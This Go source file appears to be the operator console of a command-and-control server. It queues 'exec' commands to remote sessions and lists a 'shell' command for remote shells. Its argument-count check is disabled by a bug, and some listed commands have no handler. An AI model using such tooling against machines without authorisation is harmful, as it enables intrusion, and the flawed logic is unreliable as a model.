package main

import (
	"bufio"
	"database/sql"
	"fmt"
	"log"
	"strconv"
	"strings"
)

// //////// LISTS ///////////////
// //// AVAILABLE COMMANDS
var commands = []InputCommand{}

// ///////////  LOGS / CONSOLE MANAGEMENT ////////////////

func NewCommand(name string, args []string, noMaxArgs bool, description string) InputCommand {
	if !noMaxArgs {
		noMaxArgs = true
	}
	return InputCommand{name, args, noMaxArgs, description}
}
func InitCommands() {
	commands = append(commands, NewCommand("help", []string{}, false, "Show help"))
	commands = append(commands, NewCommand("version", []string{}, false, "Show version"))
	commands = append(commands, NewCommand("show", []string{"sessions / sessiond_id"}, false, "Show session list"))
	commands = append(commands, NewCommand("exec", []string{"session_id", "args"}, true, "Execute a command on a specified session"))
	commands = append(commands, NewCommand("shell", []string{"session_id"}, false, "Start a remote shell session on a specified session"))
	commands = append(commands, NewCommand("verbosity", []string{"enable / disable"}, false, "Enable / disable program's verbosity"))

}

func Help() {
	fmt.Println("---- HELP ----")
	for i := 0; i < len(commands); i++ {
		fmt.Println("> " + commands[i].Name)
		fmt.Println("Usage:")
		fmt.Print("  " + commands[i].Name)
		for a := 0; a < len(commands[i].Args); a++ {
			fmt.Print(" ")
			fmt.Print(commands[i].Args[a])
		}
		fmt.Print("\n")
		fmt.Println("Description: ")
		fmt.Println("  " + commands[i].Description)
		fmt.Println("")
	}

}

func ExecCmd(sid string, args []string, db *sql.DB) {
	ZAvailability(sid, db)
	argsMap := argsToMap(args)
	queueMutex.Lock()
	commandQueue[sid] = &ResHeartBeat{
		Type: "exec",
		Args: argsMap,
	}
	queueMutex.Unlock()
	LogEx(l, "InputCommand Queue: "+"SID: "+sid+" Type: "+commandQueue[sid].Type+" Arguments: "+strings.Join(args, " "), true)
}

// TODO: find another way to interact with db cuz thats weird, nah?
func UserInput(r *bufio.Reader, db *sql.DB) {
	for {
		fmt.Print(inputPrefix)
		input, err := r.ReadString('\n')
		if err != nil {
			log.Fatal(err)
		}
		input = strings.TrimSpace(input)

		Interpreter(l, input, db)
	}
}

func ChangeVerbosity(state string) {
	state = strings.ToLower(state)
	if state == "1" {
		*verbose = true
		LogEx(l, "[VERBOSITY] Verbosity enabled", true)
	} else if state == "0" {
		*verbose = false
		LogEx(l, "[VERBOSITY] Verbosity disabled", true)

	}
}

func Interpreter(l *log.Logger, input string, db *sql.DB) {
	if input == "" {
		return
	}
	splittedInput := strings.Split(input, " ")

	cmdName := splittedInput[0]

	command := NewCommand("", []string{""}, false, "")
	for i := 0; i < len(commands); i++ {

		if (commands[i].Name) == cmdName {

			command = commands[i]
		}

	}
	if command.Name == "" {
		Error(l, "InputCommand not found, type help")
		return
	}

	if !(len(command.Args) == (len(splittedInput) - 1)) && command.NoMaxArgs == false {

		Error(l, "Invalid number of arguments given, "+strconv.Itoa(len(command.Args))+" expected")
		Log(l, "Usage: ")
		Log(l, "  "+command.Name+" "+strings.Join(command.Args, " "))

		fmt.Print("\n")
		return
	}

	// TODO: CHECK SID VALIDITY

	switch command.Name {
	case "help":
		Help()
	case "exec":
		sid := splittedInput[1]
		args := splittedInput[2:]
		ExecCmd(sid, args, db)

	case "verbosity":
		state := splittedInput[1]

		ChangeVerbosity(state)
	}

}
